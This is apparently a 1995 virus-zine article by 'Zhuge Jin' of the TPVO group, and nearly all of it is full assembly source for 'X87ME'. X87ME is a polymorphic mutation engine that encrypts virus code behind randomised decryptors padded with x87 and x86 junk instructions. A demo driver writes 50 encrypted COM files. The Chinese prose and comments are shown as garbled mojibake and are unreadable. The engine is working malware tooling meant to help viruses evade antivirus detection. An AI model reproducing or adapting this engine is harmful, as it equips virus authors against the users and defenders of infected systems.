
                                                                     P.004

         TpVOtPVoTpvOTpVOtpVoTPvOTPVOtpVOTPvOtPVOtPVOtPvOTPvOTpVoTPVO
         PT                                                        OT
         VP     ¥x ÆW «Â ¤O ¯f ¬r ²Õ Â´   ¯f¬rÂø»x   ²Ä ‘B ´Á      TP
         oV                                                        PV
         TO                 Ææ  8087 ÅÜÊ^¤ÞÀº  Ææ                  Vo
         pT                                                        OT
         VP                     by  Zhuge Jin                      VP
         OV                                                        OV
         OVTPVoTpvOtPvoTPVOtPvoTpVotpvoTpVotpvOtPvoTpVOtpvOTPvOTpvOTP


   ¶Ù¡T¤j®a¦n¡T«Ü°ª¿³¤S¦³¾÷·|¸ò¤j®a¡A¬ã¨s¼gÅÜÊ^¤ÞÀºªº¼g§@¤èªk¡T¯u±o¥Î x87
   «ü¥O¥i¥H¼g¥XÅÜÊ^¤ÞÀº¶Ü¡S¯à¥Î x87 §@¸Ñ½X°Ê§@¶Ü¡S

   Okay¡T©Ò¥H²{¦b­n§i¶D§Aµª®×¬O¥i¥Hªº¡T¦ý¬O­n¦Ò¼{¬O§_¦³ x87 ªº¦s¦b»P§_¡T¦p
   §Ú­Ìªº¹q¸£¨S¦³ x87 ªº¸Ü, §Ú­Ì³o¨Ç«ü¥O·|³Q pass ¹L¡T¦pªG§Ú­Ì¥Î x87 ¨Ó§@
   ¸Ñ½Xªº¸Ü¨º°Z¤£´N·|¥¢±Ñ¡S¦]¦¹§Ú¦Ò¼{±N x87 «ü¥O§@¬°©U§£«ü¥O¡T¨º§A·|°Ý¦p¦ó
   ¥Î x87 ¨Ó¸Ñ½X¡T¨Æ¹ê¤W, ¥u¬O¥Î x87 ¨Ó¹Bºâ¤@­Ó¼Æ­È¨ÓÅý x86 ¨Ó§@½s½X¦Ó¤w!
   ³o¸ÌÁÙ­n¦Ò¼{¼Æ­È¬O§_·|·¸¦ì¡B°£¹s¡A¦]¦¹«Ü¦h«ü¥O¨Ã¤£¯àÀH«K¥Î¡T¤×¨ä¬O¦b°j°é
   ¸ÌÃþ¦ü FADD [BX+SI] [BX+SI] ¥i¯àµ¥©ó [FFFF]¡S¦Ó x87 «ü¥O¨Ã¤£¬O¦s¨ú¤@­Ó
   byte ©Î word ¡T¦Ó¬O dword ©M qword ¡T³o¤@¨Ó°ÝÃD´N§ó¤j¤F¡T©Ò¥H§Ú¼g³o­Ó¤Þ
   Àº¥u¦³¥Î¨ì¤@³¡¥÷¦Ó¤w¡A©Ò¥H¨Ã¤£¬O«Ü¶Ã¡T

   ÁöµM¦p¦¹... ³o­Ó¤ÞÀº¤]Åã±o«D±`ªº¤p (¬ù 490 bytes) ¤ñ°_ MIME ÅÜÊ^¤ÞÀºÁÙ
   ¤p 100 bytes ¦h¡T¸Ñ½X¤è¦¡¥u¦³¤TºØ (add¡Bsub¡Bxor) , ¦Ó MIME ¦³¥|ºØ (inc
   ¡Bdec¡Bror¡Brol)¡T¤£¹L¤pÂk¤p¯à¥Î´N¦n¤F¡T

   ¨ä¤¤¦p¦³°ÝÃD¡A½Ð°Ñ¦Ò¤W´ÁÅÜÊ^¤ÞÀº¼g§@¤¤ªº 8086 «ü¥Oªí¡A©Î¬O¥Î debug ¥h
   trace ¡T¥H¤U´N¬O§Úªº½d¨Ò...

; This is [X87ME]
; Written by Zhuge Jin in Taipei, Taiwan.
; (C) Copyright TPVO . , 1995.

        .286
        .MODEL TINY
        .CODE

msg_addr equ OFFSET msg-OFFSET proc_start-3

        org 0100h

start:
        mov ah,09h
        mov dx,OFFSET gen_msg
        int 21h

        mov ax,OFFSET X87ME_E+000fh
        shr ax,04h
        mov bx,cs
        add bx,ax
        mov es,bx
        mov cx,0050

gen_l1:
        push cx

        mov ah,3ch
        xor cx,cx
        mov dx,OFFSET file_name
        int 21h

        push ax

        in ax,40h
        and ax,0001h
        mov bx,ax
        mov cx,OFFSET proc_end-OFFSET proc_start
        mov dx,OFFSET proc_start
        mov bp,0100h

        call X87ME

        pop bx

        mov ah,40h
        int 21h

        mov ah,3eh
        int 21h

        push cs
        pop ds

        mov bx,OFFSET file_no
        inc byte ptr ds:[bx+01h]
        cmp byte ptr ds:[bx+01h],'9'
        jbe gen_l2
        inc byte ptr ds:[bx]
        mov byte ptr ds:[bx+01h],'0'

gen_l2:
        pop cx
        loop gen_l1

        mov ah,4ch
        int 21h

file_name db 'T'
file_no db '00.COM',00h
gen_msg db 0dh,0ah,'Generates 50 [X87ME] encrypted test files...',0dh,0ah,'$'

proc_start:
        call $+0003h
        pop dx
        add dx,msg_addr
        mov ah,09h
        int 21h
        int 20h

msg db 'This is a [X87ME] test file!$'

proc_end:

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
; [X87ME] by Zhuge Jin of TPVO.
; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
; °Ñ¼Æ»¡©ú:
; bl=00h ¥Î©ó .com ªº®æ¦¡¡Tbl=01h ¥Î©ó .exe ªº®æ¦¡¡T
; bp ¸Ñ½Xµ{¦¡ªº°¾²¾¦ì§}¡T
; es:0000h ¥Î¨Ó«ü©w¦s©ñ (¸Ñ½Xµ{¦¡+³Q½s½Xµ{¦¡) ªº°Ï¬q¡T
; cx ³Q½s½Xªºµ{¦¡ªø«×¡T
; ds:dx «ü¦V­n³Q½s½Xªºµ{¦¡¦ì§}, ³q±`¬O«ü¦V¯f¬r¶}ÀY¡T
; ªð¦^­È:
; cx (¸Ñ½Xµ{¦¡+³Q½s½Xªºµ{¦¡) ªºªø«×¡T
; ds:dx «ü¦V (¸Ñ½Xµ{¦¡+³Q½s½Xªºµ{¦¡) ªº¦ì¸m¡T
; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

enc_cod db 10101000b,02h, 10000000b,2ah, 10110000b,32h, 10110000b,32h
; ¸Ñ½X¤è¦¡ sub.......add  add.......sub  xor.......xor  xor.......xor

reg_cod db 011b,111b,   101b,110b,   110b,100b,   111b,101b
; ¼È¦s¾¹   bx,[bx+disp] bp,[bp+disp] si,[si+disp] di,[di+disp]

reg db ?,?
; ¦s©ñ reg_cod

a0 dw ?  ; °j°éªº°_©l¦ì§}
a1 dw ?  ; mov reg,xxxxh ªº¦ì§}
a2 dw ?  ; xor byte ptr [reg+xxxxh],xxh ªº¦ì§}
a3 dw ?  ; jz xxxxh ªº¦ì§}
a4 dw ?  ; jmp xxxxh ªº¦ì§}

X87ME:
        cld        ; Ãö¤è¦VºX¼Ð

        push ds    ; «O¯d ds:dx
        push dx    ;

        push cs    ; set ds:=cs
        pop ds     ;

        and bl,01h      ; set bl:=0b or 1b

        xor di,di       ; set di:=0000h

        call make_tsh_cod

        mov si,OFFSET reg_cod   ; ¨M©w reg ªººØÃþ
        call rnd_si             ;
        lodsw                   ;
        mov word ptr ds:reg,ax  ; ±N reg ¼È¦s°_¨Ó

        or al,0b8h              ; ²£¥Í mov reg,xxxxh
        stosb                   ;
        mov ds:a1,di            ;
        stosw                   ;

        call make_tsh_cod
        call make_tsh_cod

        mov ds:a0,di            ; °j°éªº°_©l

        call make_tsh_cod

        test bl,01h             ; if bl:=1b ¬° .exe ²£¥Í cs:
        jz un_cs                ;    bl:=0b ¬° .com «h¸õ¹L
        mov al,2eh
        stosb
un_cs:

        in al,40h               ; ²£¥Í add byte ptr [reg+disp],xxh
        and al,02h              ;      sub byte ptr [reg+disp],xxh
        add al,80h              ;      xor byte ptr [reg+disp],xxh
        stosb                   ;
        mov si,OFFSET enc_cod   ;
        call rnd_si             ;
        lodsw                   ;
        mov ds:enc_buf,ah       ;
        or al,ds:[reg+01h]      ;
        stosb                   ;
        mov ds:a2,di            ;
        in ax,40h               ; disp
        stosw                   ;
        in al,40h               ; ½s½X­È
        stosb                   ;

        call make_tsh_cod

        mov al,40h              ; ²£¥Í inc reg
        or al,ds:reg            ;
        stosb                   ;

        call make_tsh_cod

        mov ax,0f881h           ; ²£¥Í cmp reg,xxxxh
        or ah,ds:reg            ;
        stosw                   ;
        mov ds:a3,di            ;
        stosw                   ;

        or bl,10000000b         ; ²£¥Í¤£·|§ïÅÜºX¼Ðªº©U§£½X
        call make_tsh_cod       ;
        and bl,00000001b        ;

        mov al,74h              ; ²£¥Í jz xxxxh
        stosb                   ;
        mov ds:a4,di            ;
        stosb                   ;

        call make_tsh_cod

        mov al,0e9h             ; ²£¥Í jmp xxxxh
        stosb                   ;
        mov ax,ds:a0            ;
        sub ax,di               ;
        dec ax                  ;
        dec ax                  ;
        stosw                   ;

        in ax,40h               ; ¥[¤@­Ó­Èµ¹ di
        and ax,0fh              ;
        add di,ax               ;

        mov si,ds:a4            ; ³]©w jz xxxxh ­n¸õ¨ìªº¦ì§}
        mov ax,di               ;
        sub ax,si               ;
        dec ax                  ;
        mov es:[si],al          ;

        mov ax,di               ; ³]©w mov reg,xxxxh ªºªì­È
        add ax,bp               ;
        mov si,ds:a2            ;
        sub ax,es:[si]          ;
        mov dl,es:[si+02h]      ; dl ¬°½s½X­È
        mov si,ds:a1            ;
        mov es:[si],ax          ;
        mov ds:a1,ax            ;

        pop si                  ; ´N¬O¥ý«e push ds dx
        pop ds                  ;

        push cx

enc_prg:
        lodsb

enc_buf db 90,0c2h              ; ½s½X°Ê§@ add al,dl¡Bsub al,dl¡Bxor al,dl

        stosb
        loop enc_prg

        pop cx

        mov si,ds:a3            ; ³]©w cmp reg,xxxxh ªº­È
        mov ax,ds:a1            ;
        add ax,cx               ;
        mov es:[si],ax          ;

x87me_ext:
        mov cx,di  ; ³]©wªð¦^°Ñ¼Æ
        xor dx,dx  ;
        push es    ;
        pop ds     ;
        ret

rnd_si:
        in ax,40h               ; ¨M©w si ªº¶Ã¼Æ­È
        add al,es:[di-02h]
        neg ax
        and ax,0003h
        test bl,10000000b
        jz rs_a
        and al,01h
rs_a:
        add ax,ax
        add si,ax
        ret

mtc_tab dw OFFSET mtc1,OFFSET mtc2,OFFSET mtc3,OFFSET mtc4

make_tsh_cod:
        push cx                ; ²£¥Í©U§£«ü¥O
        in ax,40h
        and ax,0007h
        add ax,0003h
        mov cx,ax
mtc_l:
        mov si,OFFSET mtc_tab
        call rnd_si
        in ax,40h
        add al,es:[di-02h]
        call ds:[si]
        loop mtc_l
        pop cx
        ret

mtc1:
        mov al,0d8h             ; ²£¥Í x87 ªº©U§£«ü¥O
        stosb                   ; §A¥i¥H±N³o­Ó°Æµ{¦¡¥[¤J§A¼gªº¤ÞÀº
mtc1_a1:                        ; ³o¼Ë§Aªº¤ÞÀº¤]¥i¥H²£¥Í x87 ªº«ü¥O
        in ax,40h
        mov al,ah
        and ah,00111000b
        cmp ah,00001000b
        jz mtc1_a1
        cmp ah,00110000b
        jae mtc1_a1
        mov ah,al
        and ah,11000111b
        cmp ah,00000110b
        jnz mtc1_a2
        stosb
        in ax,40h
        stosw
        ret
mtc1_a2:
        or al,11000000b
        stosb
        ret

mtc2:
        and al,01h              ; ²£¥Í mov reg,(xx)xxh ªº©U§£«ü¥O
        mov dl,al
        shl dl,03h
        call rnd_reg
        and al,00000111b
        or al,0b0h
        or al,dl
        stosb
        cmp al,0b8h
        in ax,40h
        jb mtc2_a
        stosb
mtc2_a:
        stosb
        ret

mtc3:
        cmp al,0a0h
        jae mtc3_a3
        cmp al,40h
        jae mtc3_a2
mtc3_a1:
        and al,11111101b        ; ²£¥Í add reg,reg
        stosb                   ;      sub reg,reg
        mov ah,al               ;      xor reg,reg
        and ah,00000100b        ;      add reg,reg
        jnz mtc3_a1b            ;      ...         µ¥©U§£«ü¥O
        call rnd_reg
        stosb
        ret
mtc3_a1b:
        and al,01h
        cbw
        add di,ax
        inc di
        ret

mtc3_a2:
        mov al,01h              ; ²£¥Í inc reg ªº©U§£«ü¥O
        call rnd_reg
        and al,0fh
        or al,40h
        stosb
        ret

cod db 91h,91h,98h,0d6h,0ech,0f8h,0fah
    db 27h,2fh,37h,3fh,9bh,9fh,0ceh,0cch,0f5h

mtc3_a3:
        and ax,000fh            ; ²£¥Í cod ¸Ì 1 byte ªº©U§£«ü¥O
        mov si,OFFSET cod
        add si,ax
        mov ah,ds:[si]
        cmp al,07h
        jae mtc3_a3b
        in al,40h
        and al,01h
        add ah,al
mtc3_a3b:
        mov al,ah
        stosb
        ret

mtc4:
        and al,02h              ; ²£¥Í add reg,(xx)xxh
        or al,80h               ;      sub reg,(xx)xxh
        stosb                   ;      xor reg,(xx)xxh
        call rnd_reg            ;      add reg,(xx)xxh
        stosb                   ;      ...         µ¥©U§£«ü¥O
        in ax,40h
        stosw
        cmp byte ptr es:[di-04h],81h
        jz mtc4_a
        dec di
mtc4_a:
        ret

rnd_reg:
        mov bh,al               ; ²£¥Í¶Ã¼Æªº¼È¦s¾¹
rr_a1:                          ; ³o¨Ç¼È¦s¾¹¤£·|¸ò¥Ø«e¸Ñ½Xªº¼È¦s¾¹¬Û¦P
        test bh,01h             ; ¤]¤£·|¬O sp
        in al,40h               ; xx xxx xxx b
        mov ah,al               ; ^^^^^^ ^^^
        jnz rr_a2               ; ¶Ã¼Æ   ¼È¦s¾¹
        and ah,00000011b
rr_a2:
        and ah,00000111b
        cmp ah,00000100b
        jz rr_a1
        cmp ah,ds:reg
        jz rr_a1
        or al,11000000b
        ret

X87ME_E:

        END start

